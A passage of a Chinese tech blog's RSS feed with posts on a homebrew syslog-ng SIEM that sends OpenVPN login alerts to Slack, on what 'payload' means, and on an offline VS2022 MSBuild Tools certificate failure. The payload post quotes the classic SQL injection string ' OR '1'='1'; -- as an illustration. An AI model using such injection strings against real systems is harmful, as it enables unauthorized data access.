+</code></pre> <p>用 Slack 訊息我用得蠻多的，之前寫過 <a href="/blog/slack-api/">.NET Console 版</a> 和 <a href="/blog/azure-alert-slack/">ASP.NET Minimal API 版</a>，有 Github Copilot 撐腰，這回我嘗試直接用 Bash 腳本寫，再次擴展程式開發經驗：(註：Bash 腳本功能強大，實現各式邏輯都不成問題，但程式語法跟 JavaScript/C# 差異頗大，要上手得花點功夫，所幸現在寫 Bash 的苦差事可以交給 Copilot，我們學著看懂就好)</p> <pre><code>SLACK_TOKEN="${SLACK_BOT_TOKEN:-}"
+CHANNEL="${SLACK_CHANNEL:-}"
+usage() {
+echo "Usage:"
+echo "  $0 \"Your message\"                    # uses SLACK_CHANNEL env var"
+echo "  $0 \"#channel\" \"Your message\"         # specify channel as first arg"
+echo "  echo \"Your message\" | $0 \"#channel\"  # read message from stdin"
+echo "Environment:"
+echo "  SLACK_BOT_TOKEN   - required bot OAuth token (xoxb-...)"
+echo "  SLACK_CHANNEL     - optional default channel (used when only one arg)"
+exit 1
+}
+if [ -z "$SLACK_TOKEN" ]; then
+echo "Error: SLACK_BOT_TOKEN is not set."
+usage
+fi
+# Check if input is coming from pipeline
+if [ ! -t 0 ]; then
+# Read from stdin (pipeline)
+MESSAGE=$(cat)
+if [ "$#" -ge 1 ]; then
+CHANNEL="$1"
+else
+if [ -z "$CHANNEL" ]; then
+echo "Error: Channel not provided and SLACK_CHANNEL is not set."
+usage
+fi
+fi
+else
+# Read from command line arguments (existing logic)
+if [ "$#" -eq 0 ]; then
+usage
+elif [ "$#" -ge 2 ]; then
+CHANNEL="$1"
+shift
+MESSAGE="$*"
+else
+MESSAGE="$1"
+if [ -z "$CHANNEL" ]; then
+echo "Error: Channel not provided and SLACK_CHANNEL is not set."
+usage
+fi
+fi
+fi
+# simple JSON-escaping (handles backslashes, quotes, CR/LF)
+esc=${MESSAGE//\\/\\\\}
+esc=${esc//\"/\\\"}
+esc=${esc//$'\r'/\\r}
+esc=${esc//$'
+'/\
+}
+PAYLOAD="{\"channel\":\"${CHANNEL}\",\"text\":\"${esc}\"}"
+# send message
+RESP=$(curl -s -X POST "https://slack.com/api/chat.postMessage" \
+-H "Authorization: Bearer ${SLACK_TOKEN}" \
+-H "Content-Type: application/json; charset=utf-8" \
+--data "$PAYLOAD")
+if echo "$RESP" | grep -q '"ok":true'; then
+echo "Message posted"
+exit 0
+else
+echo "Slack API error"
+echo "$RESP"
+exit 2
+</code></pre> <p>先用 OpenVPN 連線事件當偵測對象，我鎖定以下三種事件，遇到特定關鍵字時將整條 Log 發送到 Slack 頻道，便能實現即時通知。</p> <ul><li>建立連線：Sep 21 13:32:41 vpnserver1[23420]: TCP connection established with [AF_INET6]::ffff:168.192.1.1:12345</li> <li>登入失敗：Sep 21 13:32:42 vpnserver1[23420]: 168.192.1.1:12345 TLS Auth Error: Auth Username/Password verification failed for peer</li> <li>登入成功：Sep 21 14:37:12 vpnserver1[16894]: client/168.192.1.1:12345 TLS: Username/Password authentication succeeded for username 'user'</li></ul> <p>要實現以上邏輯，./config/syslog-ng.config 的寫法如下：</p> <pre><code>@version: 4.2
+source s_net {
+udp(ip("0.0.0.0") port(5514)); # 設定接收 UDP 5514 及 6601
+syslog(ip("0.0.0.0") transport("tcp") port(6601));
+};
+destination d_file { # 將所有 Log 以日期分檔、月份分目錄保存備查
+file("/var/log/${YEAR}${MONTH}/${YEAR}-${MONTH}-${DAY}.log"
+create_dirs(yes)
+owner("1000") group("1000") perm(0644)
+template("$ISODATE $MSG
+")
+template_escape(no)
+);
+};
+filter f_openvpn { # 設定過濾器，偵測訊息是否出現特定關鍵字
+(message("TCP connection established with") or
+message("TLS: Username/Password authentication succeeded") or
+message("TLS Auth Error"))
+};
+destination d_post_slack { # 若符合過濾條件，將 Log 傳送給指定 Bash 腳本發送 Slack 通知
+program("/batch/post-loop.sh");
+};
+destination d_debug_file { # 偵錯用 Log，可用於輸出符合過濾條件的 Log，方便確認比對是否成功
+file("/var/log/debug.log"
+owner("1000") group("1000") perm(0644)
+template("$ISODATE $MSG
+")
+template_escape(no)
+);
+};
+log { # 設定 Pipeline
+source(s_net); # 來源 UDP 5514 /TCP 6601
+destination(d_file); # 一律寫入日期分檔 Log
+if {
+filter(f_openvpn); # 比對符合過濾條件才繼續往下執行
+# destination(d_debug_file);
+destination(d_post_slack); # 發送通知
+};
+};
+# echo "&lt;14&gt;Test UDP syslog message" | nc -u -w5 localhost 514
+</code></pre> <p>/batch/post-loop.sh 的寫法較特殊，要寫成無窮迴圈持續接收 stdin 傳入的內容，我原以為是一條訊息呼叫一次，搞錯觀念在這裡卡了一陣子。另外有個小眉角是每隔 20 分鐘 syslog-ng 會發送類似 Heartbeat 的 <code>MARK --</code> 訊息，要忽略以免收到無意義的通知。</p> <pre><code>#!/bin/bash
+while read line ; do
+# if it contains "MARK --" heartbeat, ignore it
+[[ "$line" == *"MARK --"* ]] &amp;&amp; continue
+echo $line | /batch/post-slack-msg.sh
+done
+</code></pre> <p>就醬，現在只要有人嘗試連線 OpenVPN 時我都會在 Slack 接到即時通知 (OpenVPN 預設 3600 秒自動重新協商 TLS 加密金鑰，持續連線時每小時會定期收到成功登入記錄)，甚至意外在週日晚上偵測到 <a href="/blog/abuseipdb/">AbusedIPDB 通報在案</a>的可疑 IP 跑來掃 Port：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638938874282476059.png"></p> <p>我的家用型土砲 SIEM 成功邁出第一步，哈!</p> <p data-slug="homebrew-siem-for-openvpn-connection-alert" data-fbimg="https://cdn.pixabay.com/photo/2018/04/07/08/27/plane-3297987_1280.jpg#1280#720"> </p>]]>
+    </description>
+    <content:encoded><![CDATA[<p>這些年我新學到不少資安名詞，<a href="https://www.microsoft.com/zh-tw/security/business/security-101/what-is-siem?WT.mc_id=DOP-MVP-37580">SIEM (Security Enformation and Event Management，安全性資訊與事件管理)</a>是其中之一，指的是即時收集、彙總及分析來自全組織應用程式、裝置、伺服器和使用者的大量資安相關資料，合併到單一整合式平台，以提供組織安全性態勢的全方位檢視，讓安全性作業中心 (Security Operation Center, SOC)(這是另一個資安名詞)能夠快速且有效地偵測、調查及回應安全性事件。</p> <p>身為平日疑神疑鬼、老擔心家裡無線路由器正被人偷連的網路被害妄想症患者 (我甚至幹過清查家裡所有平板手機 MAC 地址 + IP 造冊列管的瘋事，不意外地被家人當成有病)，在家裡搞一套 SIEM 也是很合情合理滴。我想做到每次有新裝置連上無線網站、用 OpenVPN 登入，要能第一時間接到通知。企業級的地端 SIEM 產品如 Splunk、QRadar 價格不斐，最近<a href="/blog/centos7-debian12-migrate/">家用迷你伺服器剛升級 Debian 12</a>，剛好可以跑 syslog-ng Docker 接收 Asus RT-AC66U syslog 訊息，再寫幾行程式<a href="/blog/azure-alert-slack/">串接 Slack 發即時通知</a>，不花一毛錢就能搞出一套簡單的資安事件即時通知機制。</p> <p>先說原理，Asus 路由器支援將所有 Log 轉發到指定的 syslog 伺服器：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638938874279311959.png"></p> <p>syslog 是一個古老的日誌傳輸與格式協定，裝置會傳送標註 facility(事件類別) 與 severity(嚴重度 0–7) 的訊息，並附帶時間與來源位址以便後續查詢與告警。在 Unix/Linux 系統上，可執行 rsyslog、syslog-ng 或 journald 等服務透過 UDP 514 (輕量但不保證送達)、TCP 514/601 或加密的 TLS (常見 6514) Port 接收第三方裝置送來的 Log。經過評估，syslog-ng 可用 Docker 架設，效能跟可擴充性不錯且使用者眾多，其來源/過濾/目的地的管線設計挺直覺，定義語法雖然得花點時間熟悉，但「遇到特定關鍵字可拋給外部自訂程式處理」的架構十分彈性，用 Bash、PowerShell、.NET 寫點程式再複雜的偵測與判斷邏輯都能實現，就決定是它了。</p> <p>我先用下面的 docker-compose.yaml 宣告 Docker 容器在 Debian 上跑 syslog-ng 服務，聽 514/601/6514 Port 接收遠端裝置的 syslog，/config 對映設定檔目錄放 syslog-ng.conf 設定檔、/var/log 對映 Log 目錄，再多設一個 /batch 來放自訂的訊息處理程式，<code>SLACK_CHANNEL</code>、<code>SLACK_BOT_TOKEN</code> 環境變數則用來發送 Slack 訊息用的：</p> <pre><code>---
+services:
+syslog-ng:
+image: lscr.io/linuxserver/syslog-ng:latest
+container_name: syslog-ng
+environment:
+- PUID=1000
+- PGID=1000
+- TZ=Etc/UTC
+- LOG_TO_STDOUT= #optional
+- SLACK_CHANNEL=資安通知
+- SLACK_BOT_TOKEN=xoxb-...&lt;slack-api-key&gt;...
+volumes:
+- ./config:/config
+- ./log:/var/log
+- ./batch:/batch
+ports:
+- 514:5514/udp
+- 601:6601/tcp
+- 6514:6514/tcp
+restart: unless-stopped
+</code></pre> <p>用 Slack 訊息我用得蠻多的，之前寫過 <a href="/blog/slack-api/">.NET Console 版</a> 和 <a href="/blog/azure-alert-slack/">ASP.NET Minimal API 版</a>，有 Github Copilot 撐腰，這回我嘗試直接用 Bash 腳本寫，再次擴展程式開發經驗：(註：Bash 腳本功能強大，實現各式邏輯都不成問題，但程式語法跟 JavaScript/C# 差異頗大，要上手得花點功夫，所幸現在寫 Bash 的苦差事可以交給 Copilot，我們學著看懂就好)</p> <pre><code>SLACK_TOKEN="${SLACK_BOT_TOKEN:-}"
+CHANNEL="${SLACK_CHANNEL:-}"
+usage() {
+echo "Usage:"
+echo "  $0 \"Your message\"                    # uses SLACK_CHANNEL env var"
+echo "  $0 \"#channel\" \"Your message\"         # specify channel as first arg"
+echo "  echo \"Your message\" | $0 \"#channel\"  # read message from stdin"
+echo "Environment:"
+echo "  SLACK_BOT_TOKEN   - required bot OAuth token (xoxb-...)"
+echo "  SLACK_CHANNEL     - optional default channel (used when only one arg)"
+exit 1
+}
+if [ -z "$SLACK_TOKEN" ]; then
+echo "Error: SLACK_BOT_TOKEN is not set."
+usage
+fi
+# Check if input is coming from pipeline
+if [ ! -t 0 ]; then
+# Read from stdin (pipeline)
+MESSAGE=$(cat)
+if [ "$#" -ge 1 ]; then
+CHANNEL="$1"
+else
+if [ -z "$CHANNEL" ]; then
+echo "Error: Channel not provided and SLACK_CHANNEL is not set."
+usage
+fi
+fi
+else
+# Read from command line arguments (existing logic)
+if [ "$#" -eq 0 ]; then
+usage
+elif [ "$#" -ge 2 ]; then
+CHANNEL="$1"
+shift
+MESSAGE="$*"
+else
+MESSAGE="$1"
+if [ -z "$CHANNEL" ]; then
+echo "Error: Channel not provided and SLACK_CHANNEL is not set."
+usage
+fi
+fi
+fi
+# simple JSON-escaping (handles backslashes, quotes, CR/LF)
+esc=${MESSAGE//\\/\\\\}
+esc=${esc//\"/\\\"}
+esc=${esc//$'\r'/\\r}
+esc=${esc//$'
+'/\
+}
+PAYLOAD="{\"channel\":\"${CHANNEL}\",\"text\":\"${esc}\"}"
+# send message
+RESP=$(curl -s -X POST "https://slack.com/api/chat.postMessage" \
+-H "Authorization: Bearer ${SLACK_TOKEN}" \
+-H "Content-Type: application/json; charset=utf-8" \
+--data "$PAYLOAD")
+if echo "$RESP" | grep -q '"ok":true'; then
+echo "Message posted"
+exit 0
+else
+echo "Slack API error"
+echo "$RESP"
+exit 2
+</code></pre> <p>先用 OpenVPN 連線事件當偵測對象，我鎖定以下三種事件，遇到特定關鍵字時將整條 Log 發送到 Slack 頻道，便能實現即時通知。</p> <ul><li>建立連線：Sep 21 13:32:41 vpnserver1[23420]: TCP connection established with [AF_INET6]::ffff:168.192.1.1:12345</li> <li>登入失敗：Sep 21 13:32:42 vpnserver1[23420]: 168.192.1.1:12345 TLS Auth Error: Auth Username/Password verification failed for peer</li> <li>登入成功：Sep 21 14:37:12 vpnserver1[16894]: client/168.192.1.1:12345 TLS: Username/Password authentication succeeded for username 'user'</li></ul> <p>要實現以上邏輯，./config/syslog-ng.config 的寫法如下：</p> <pre><code>@version: 4.2
+source s_net {
+udp(ip("0.0.0.0") port(5514)); # 設定接收 UDP 5514 及 6601
+syslog(ip("0.0.0.0") transport("tcp") port(6601));
+};
+destination d_file { # 將所有 Log 以日期分檔、月份分目錄保存備查
+file("/var/log/${YEAR}${MONTH}/${YEAR}-${MONTH}-${DAY}.log"
+create_dirs(yes)
+owner("1000") group("1000") perm(0644)
+template("$ISODATE $MSG
+")
+template_escape(no)
+);
+};
+filter f_openvpn { # 設定過濾器，偵測訊息是否出現特定關鍵字
+(message("TCP connection established with") or
+message("TLS: Username/Password authentication succeeded") or
+message("TLS Auth Error"))
+};
+destination d_post_slack { # 若符合過濾條件，將 Log 傳送給指定 Bash 腳本發送 Slack 通知
+program("/batch/post-loop.sh");
+};
+destination d_debug_file { # 偵錯用 Log，可用於輸出符合過濾條件的 Log，方便確認比對是否成功
+file("/var/log/debug.log"
+owner("1000") group("1000") perm(0644)
+template("$ISODATE $MSG
+")
+template_escape(no)
+);
+};
+log { # 設定 Pipeline
+source(s_net); # 來源 UDP 5514 /TCP 6601
+destination(d_file); # 一律寫入日期分檔 Log
+if {
+filter(f_openvpn); # 比對符合過濾條件才繼續往下執行
+# destination(d_debug_file);
+destination(d_post_slack); # 發送通知
+};
+};
+# echo "&lt;14&gt;Test UDP syslog message" | nc -u -w5 localhost 514
+</code></pre> <p>/batch/post-loop.sh 的寫法較特殊，要寫成無窮迴圈持續接收 stdin 傳入的內容，我原以為是一條訊息呼叫一次，搞錯觀念在這裡卡了一陣子。另外有個小眉角是每隔 20 分鐘 syslog-ng 會發送類似 Heartbeat 的 <code>MARK --</code> 訊息，要忽略以免收到無意義的通知。</p> <pre><code>#!/bin/bash
+while read line ; do
+# if it contains "MARK --" heartbeat, ignore it
+[[ "$line" == *"MARK --"* ]] &amp;&amp; continue
+echo $line | /batch/post-slack-msg.sh
+done
+</code></pre> <p>就醬，現在只要有人嘗試連線 OpenVPN 時我都會在 Slack 接到即時通知 (OpenVPN 預設 3600 秒自動重新協商 TLS 加密金鑰，持續連線時每小時會定期收到成功登入記錄)，甚至意外在週日晚上偵測到 <a href="/blog/abuseipdb/">AbusedIPDB 通報在案</a>的可疑 IP 跑來掃 Port：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638938874282476059.png"></p> <p>我的家用型土砲 SIEM 成功邁出第一步，哈!</p> <p data-slug="homebrew-siem-for-openvpn-connection-alert" data-fbimg="https://cdn.pixabay.com/photo/2018/04/07/08/27/plane-3297987_1280.jpg#1280#720"> </p>]]></content:encoded>
+    <itunes:image href="https://blog.darkthread.net/Posts/files/2025/Fig1_638938874279311959.png"/>
+          <media:content url="https://blog.darkthread.net/Posts/files/2025/Fig1_638938874279311959.png" medium="image"/>
+    <pubDate>Fri, 19 Sep 2025 13:31:55 GMT</pubDate>
+  </item><item>
+    <title><![CDATA[【打破砂鍋】資訊、資安常在說的 Payload 到底是什麼?]]></title>
+    <link>https://blog.darkthread.net/blog/whats-payload/</link>
+    <itunes:title><![CDATA[【打破砂鍋】資訊、資安常在說的 Payload 到底是什麼?]]></itunes:title>
+    <itunes:author><![CDATA[service@darkthread.net (Jeffrey Lee)]]></itunes:author>
+    <itunes:summary>
+      <![CDATA[<p>生活周遭不乏一些平日朗朗上口，但宜要對圈外人解釋卻不知如何開口的術語或名詞，職業生涯中有一個讓我印象超級深刻 - 投資部位的「部位」。</p> <p>年輕時剛進公司接觸系統時，有段時間成天被陌生金融名詞轟炸。由前後文我約略能揣摩「部位」是什麼東西，但怕自己誤解，總想得到專業定義。有天剛好跟前輩講到，便順勢當場請教，不料我的好奇心成了別人的困擾。學姐想了很久，一直找不出簡單明瞭能讓我解惑的說法，只記得最後她微嗔拋下一句「部位就是部位啊!」(由表情推估沒說出口的下半句是「你這人怎麼醬？」)，我有點天但不至白目，很識趣地就此打住。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638938006866122080.jpg" alt="thumbnail"><br> 聲明：照片非當事人 (謎之聲：用得著你說？)</p> <p>這幾年我則被另一個術語困惑 - Payload，它在通信、資訊、資安都會現身，由前後文我大約知道是什麼意思，但說不出精準定義，與當年的部位一詞異曲同工。時代不同了，2025 年，這種小疑惑，問 ChatGPT/Perlexity 十秒解惑，下對 Prompt 絕對能解釋到明明白白，包你滿意。</p> <p>Payloadd 源自複合詞 Pay + Load，最早見於 20 世紀初，原指運輸工具中可帶來收益的載荷，後來擴展到航太軍事的炸彈/酬載，再延伸到計算機與通訊領域表示實際資料內容。最早的 Payload 是卡車或飛機載重中會產生收入的部分，如付費乘客、郵件與貨物，和運作所需的燃料、機體形成對比</p> <p>1930年代，Payload 擴展到飛機或飛彈所攜帶的彈藥、彈頭與任務設備，成為航太軍事的常用術語。在火箭/太空任務中，Payload 指的通常是衛星、探測器或執行任務的儀器，因而衍生出 Payload Fraction 等概念，例如發射衛星的火箭，數十到幾千噸的重量中，只有 1% ~ 5% 是真正要送入太空的標的物。</p> <p>而到了計算機跟通訊領域，Payload 常指通訊或封包中「實際的資料內容」本身，於標頭或協定相關內容形成區別。若要翻譯，我會翻成「資料本體」，例如以下 HTTP POST 請求中的 JSON 部分：</p> <pre><code>POST /api/user HTTP/1.1
+Host: example.com
+Content-Type: application/json
+{
+"userName": "alice",
+"email": "alice@example.com"
+}
+</code></pre> <p>或以 TCP/IP 封包結構為例，也特別能突顯 Payload 的意義：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638938006867840738.png"><br> 圖片來源：<a href="https://textbook.cs168.io/transport/tcp-implementation.html">CS 168 Textboox / TCP Implementation</a></p> <p>資安領域，Payload 指的則是進行惡意攻擊（如 SQL 注入、XSS、Buffer Overflow）場景中攻擊者希望注入或執行的惡意程式碼或指令。例如，SQL Injection 中的 <code>' OR '1'='1'; --</code>，或是藏在一般軟體中的木馬或病毒程式。</p> <p>總之，回歸最早馬車、火箭受命載物的核心精神，對應衍生的 Payload 適用情境，其意義就變得澄清通透，再面對這個術語就不會迷惘了。</p> <p data-slug="whats-payload" data-fbimg="https://i.postimg.cc/0j6wH8bd/image.png#1280#800"> </p>]]>
+    </itunes:summary>
+    <description>
+      <![CDATA[<p>生活周遭不乏一些平日朗朗上口，但宜要對圈外人解釋卻不知如何開口的術語或名詞，職業生涯中有一個讓我印象超級深刻 - 投資部位的「部位」。</p> <p>年輕時剛進公司接觸系統時，有段時間成天被陌生金融名詞轟炸。由前後文我約略能揣摩「部位」是什麼東西，但怕自己誤解，總想得到專業定義。有天剛好跟前輩講到，便順勢當場請教，不料我的好奇心成了別人的困擾。學姐想了很久，一直找不出簡單明瞭能讓我解惑的說法，只記得最後她微嗔拋下一句「部位就是部位啊!」(由表情推估沒說出口的下半句是「你這人怎麼醬？」)，我有點天但不至白目，很識趣地就此打住。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638938006866122080.jpg" alt="thumbnail"><br> 聲明：照片非當事人 (謎之聲：用得著你說？)</p> <p>這幾年我則被另一個術語困惑 - Payload，它在通信、資訊、資安都會現身，由前後文我大約知道是什麼意思，但說不出精準定義，與當年的部位一詞異曲同工。時代不同了，2025 年，這種小疑惑，問 ChatGPT/Perlexity 十秒解惑，下對 Prompt 絕對能解釋到明明白白，包你滿意。</p> <p>Payloadd 源自複合詞 Pay + Load，最早見於 20 世紀初，原指運輸工具中可帶來收益的載荷，後來擴展到航太軍事的炸彈/酬載，再延伸到計算機與通訊領域表示實際資料內容。最早的 Payload 是卡車或飛機載重中會產生收入的部分，如付費乘客、郵件與貨物，和運作所需的燃料、機體形成對比</p> <p>1930年代，Payload 擴展到飛機或飛彈所攜帶的彈藥、彈頭與任務設備，成為航太軍事的常用術語。在火箭/太空任務中，Payload 指的通常是衛星、探測器或執行任務的儀器，因而衍生出 Payload Fraction 等概念，例如發射衛星的火箭，數十到幾千噸的重量中，只有 1% ~ 5% 是真正要送入太空的標的物。</p> <p>而到了計算機跟通訊領域，Payload 常指通訊或封包中「實際的資料內容」本身，於標頭或協定相關內容形成區別。若要翻譯，我會翻成「資料本體」，例如以下 HTTP POST 請求中的 JSON 部分：</p> <pre><code>POST /api/user HTTP/1.1
+Host: example.com
+Content-Type: application/json
+{
+"userName": "alice",
+"email": "alice@example.com"
+}
+</code></pre> <p>或以 TCP/IP 封包結構為例，也特別能突顯 Payload 的意義：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638938006867840738.png"><br> 圖片來源：<a href="https://textbook.cs168.io/transport/tcp-implementation.html">CS 168 Textboox / TCP Implementation</a></p> <p>資安領域，Payload 指的則是進行惡意攻擊（如 SQL 注入、XSS、Buffer Overflow）場景中攻擊者希望注入或執行的惡意程式碼或指令。例如，SQL Injection 中的 <code>' OR '1'='1'; --</code>，或是藏在一般軟體中的木馬或病毒程式。</p> <p>總之，回歸最早馬車、火箭受命載物的核心精神，對應衍生的 Payload 適用情境，其意義就變得澄清通透，再面對這個術語就不會迷惘了。</p> <p data-slug="whats-payload" data-fbimg="https://i.postimg.cc/0j6wH8bd/image.png#1280#800"> </p>]]>
+    </description>
+    <content:encoded><![CDATA[<p>生活周遭不乏一些平日朗朗上口，但宜要對圈外人解釋卻不知如何開口的術語或名詞，職業生涯中有一個讓我印象超級深刻 - 投資部位的「部位」。</p> <p>年輕時剛進公司接觸系統時，有段時間成天被陌生金融名詞轟炸。由前後文我約略能揣摩「部位」是什麼東西，但怕自己誤解，總想得到專業定義。有天剛好跟前輩講到，便順勢當場請教，不料我的好奇心成了別人的困擾。學姐想了很久，一直找不出簡單明瞭能讓我解惑的說法，只記得最後她微嗔拋下一句「部位就是部位啊!」(由表情推估沒說出口的下半句是「你這人怎麼醬？」)，我有點天但不至白目，很識趣地就此打住。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638938006866122080.jpg" alt="thumbnail"><br> 聲明：照片非當事人 (謎之聲：用得著你說？)</p> <p>這幾年我則被另一個術語困惑 - Payload，它在通信、資訊、資安都會現身，由前後文我大約知道是什麼意思，但說不出精準定義，與當年的部位一詞異曲同工。時代不同了，2025 年，這種小疑惑，問 ChatGPT/Perlexity 十秒解惑，下對 Prompt 絕對能解釋到明明白白，包你滿意。</p> <p>Payloadd 源自複合詞 Pay + Load，最早見於 20 世紀初，原指運輸工具中可帶來收益的載荷，後來擴展到航太軍事的炸彈/酬載，再延伸到計算機與通訊領域表示實際資料內容。最早的 Payload 是卡車或飛機載重中會產生收入的部分，如付費乘客、郵件與貨物，和運作所需的燃料、機體形成對比</p> <p>1930年代，Payload 擴展到飛機或飛彈所攜帶的彈藥、彈頭與任務設備，成為航太軍事的常用術語。在火箭/太空任務中，Payload 指的通常是衛星、探測器或執行任務的儀器，因而衍生出 Payload Fraction 等概念，例如發射衛星的火箭，數十到幾千噸的重量中，只有 1% ~ 5% 是真正要送入太空的標的物。</p> <p>而到了計算機跟通訊領域，Payload 常指通訊或封包中「實際的資料內容」本身，於標頭或協定相關內容形成區別。若要翻譯，我會翻成「資料本體」，例如以下 HTTP POST 請求中的 JSON 部分：</p> <pre><code>POST /api/user HTTP/1.1
+Host: example.com
+Content-Type: application/json
+{
+"userName": "alice",
+"email": "alice@example.com"
+}
+</code></pre> <p>或以 TCP/IP 封包結構為例，也特別能突顯 Payload 的意義：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638938006867840738.png"><br> 圖片來源：<a href="https://textbook.cs168.io/transport/tcp-implementation.html">CS 168 Textboox / TCP Implementation</a></p> <p>資安領域，Payload 指的則是進行惡意攻擊（如 SQL 注入、XSS、Buffer Overflow）場景中攻擊者希望注入或執行的惡意程式碼或指令。例如，SQL Injection 中的 <code>' OR '1'='1'; --</code>，或是藏在一般軟體中的木馬或病毒程式。</p> <p>總之，回歸最早馬車、火箭受命載物的核心精神，對應衍生的 Payload 適用情境，其意義就變得澄清通透，再面對這個術語就不會迷惘了。</p> <p data-slug="whats-payload" data-fbimg="https://i.postimg.cc/0j6wH8bd/image.png#1280#800"> </p>]]></content:encoded>
+    <itunes:image href="https://blog.darkthread.net/Posts/files/2025/Fig2_638938006866122080.jpg"/>
+          <media:content url="https://blog.darkthread.net/Posts/files/2025/Fig2_638938006866122080.jpg" medium="image"/>
+    <pubDate>Thu, 18 Sep 2025 13:51:26 GMT</pubDate>
+  </item><item>
+    <title><![CDATA[【茶包射手日記】VS2022 MSBuild Tools 無法離線安裝]]></title>
+    <link>https://blog.darkthread.net/blog/vs2022-buildtools-offline-setup-issue/</link>
+    <itunes:title><![CDATA[【茶包射手日記】VS2022 MSBuild Tools 無法離線安裝]]></itunes:title>
+    <itunes:author><![CDATA[service@darkthread.net (Jeffrey Lee)]]></itunes:author>
+    <itunes:summary>
+      <![CDATA[<p>比照過往經驗準備<a href="/blog/vs-buildtools-offline-setup/">離線安裝 VS2022 MSBuild Tools</a>，使用指令 <code>vs_BuildTools.exe --layout D:\OfflineBuildTools --lang en-us --add Microsoft.VisualStudio.Workload.ManagedDesktopBuildTools --add Microsoft.VisualStudio.Workload.MSBuildTools --add Microsoft.VisualStudio.Workload.VCTools --add Microsoft.VisualStudio.Workload.WebBuildTools --includeOptional --includeRecommended</code> 下載好安裝檔複製到斷網環境，將 certificates 下的三張憑證<a href="/blog/certificate-store-difference/">安裝到本機電腦的「受信任的根憑證授權單位」憑證儲存區</a>，執行 <code>vs_buildtools.exe --noWeb</code> 理應可無腦裝完卻觸礁了...</p> <p>安裝程式卡以下畫面的驗證關卡，進度條全滿後幾秒程式閃退，啥訊息也沒講。事件檢視器出現「Windows Error Reporting」事件，追進 <code>C:\ProgramData\Microsoft\Windows\WER\ReportQueue\NonCritical_1_.....</code> 資料夾，確認是安裝程式崩潰，但看不出線索。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638937042745632565.png"></p> <p>爬文查到該安裝程式有 Log 在 <code>C:\Users\&lt;USER&gt;\AppData\Local\Temp\dd_bootstrapper_yyyyMMddHHmmss.log</code>，從中找到錯誤原因 - 是憑證驗證失敗!</p> <pre><code>Using Offline package: D:\software\OfflineMSBuildTools\vs_installer.opc
+Saving Certificates to layout folder
+Certificate is invalid: D:\software\OfflineMSBuildTools\vs_installer.opc
+Error: Unable to verify the certificate: InvalidCertificate
+Error 0x80131509: Signature verification failed.
+Error: Unable to verify the integrity of the installation files: the certificate could not be verified.
+於 Microsoft.VisualStudio.Setup.OpcVerifier.Verify(Stream packageStream, String layoutLocation,
+Boolean skipSavingCertificate)
+於 Microsoft.VisualStudio.Setup.Bootstrapper.Bootstrapper.VerifyLayoutPackage(Stream packageStream)
+Bootstrapper failed with known error.
+</code></pre> <p>再三確認 certficates 的兩張憑證已匯入(<code>manifestCounterSignRootCertificate.cer</code> 跟 <code>vs_installer_opc.RootCertificate.cer</code> 相同，是 2010 那張、<code>manifestRootCertificate.cer</code> 是 2011 那張)，為什麼還會認不得憑證？</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig3_638937042748759562.png"></p> <p>為了找出原因，我又長了一些見識。學到 .opc 是 <a href="https://learn.microsoft.com/en-us/previous-versions/windows/desktop/opc/open-packaging-conventions-overview?WT.mc_id=DOP-MVP-37580">OPC (Open Packaging Convension) 封裝格式</a>的封裝檔，裡面有個 .psdsxs XML 文件儲存數位簽名，而微軟程式庫 System.IO.Packaging 有函式可驗證及檢視 .opc 的簽名。於是我寫了一小段 .NET Framework 4.8 程式(註：關鍵類別<a href="https://learn.microsoft.com/zh-tw/dotnet/api/system.io.packaging.packagedigitalsignaturemanager?view=windowsdesktop-8.0&amp;WT.mc_id=DOP-MVP-37580">PackageDigitalSignatureManager</a>目前不支援 .NET 5+)檢查 <code>vs_installer.opc</code> 的數位簽章，有了重大發現!!</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig4_638937042752444164.png"></p> <p><code>vs_installer.opc</code> 的數位簽章來自一張署名為 <code>Microsoft Windows Code Signing PCA 2024</code> 的憑證，而非 certificates 目錄下的任何一張 (更嚴格來說，根本不是 <code>vs_installer_opc.RootCertificate.cer</code> 所說的那張)，花惹發？</p> <p>用 <code>System.IO.File.WriteAllBytes("Microsoft Windows Code Signing PCA 2024.cer", cert.Export(System.Security.Cryptography.X509Certificates.X509ContentType.Cert));</code> 另存 .cer 檔，真正要用的憑證就現身了。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig5_638937042754062802.png"></p> <p>將憑證安裝在離線環境的主機上，解開原本卡住的關卡，已下載前方出現綠勾勾，推進到安裝階段，順利完成 MSBuild Tools 安裝...</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638937042755723610.png"></p> <p>最後，由關鍵字查到 Visual Studio 問題回報區的<a href="https://developercommunity.visualstudio.com/t/Visual-Studio-2022-Build-Tools:-Offline/10925898">相關討論</a>，有網友在六月下旬報案，VS RD Team 表示已經知道這個問題，並提供了那張 Microsoft Windows Code Signing PCA 2024 憑證的下載網址，在產品未更新前可先手動下載安裝做為 Workaround。</p> <blockquote> <p>After checking with my escalation team:<br> We are currently aware of a situation related to the expiration of a Microsoft chaining certificate. A new certificate has been generated and is being used to sign files; however, it does not yet appear to be available through Microsoft Update.<br> In the meantime, for environments with offline machines, the recommended action is to manually download and deploy the following certificate alongside the other three certificates in the layout:<br> [http://www.microsoft.com/pkiops/certs/Microsoft Windows Code Signing PCA 2024.crt](<a href="http://www.microsoft.com/pkiops/certs/Microsoft?WT.mc_id=DOP-MVP-37580">http://www.microsoft.com/pkiops/certs/Microsoft</a> Windows Code Signing PCA 2024.crt)<br> We are actively working with the relevant teams to explore options for automating this process and updating the related documentation accordingly.</p> </blockquote> <p>同場加映，若必須用 .NET 8+ 開發，要如何驗證 .opc 簽章？.opc 的概念跟 .docx/.xlsx 相近，骨子裡ZIP 壓縮打包的是一堆 XML 跟 Metadata 檔，從中找出儲存簽章的 XML 就能拿到憑證。2025 年，寫程式解析 .opc 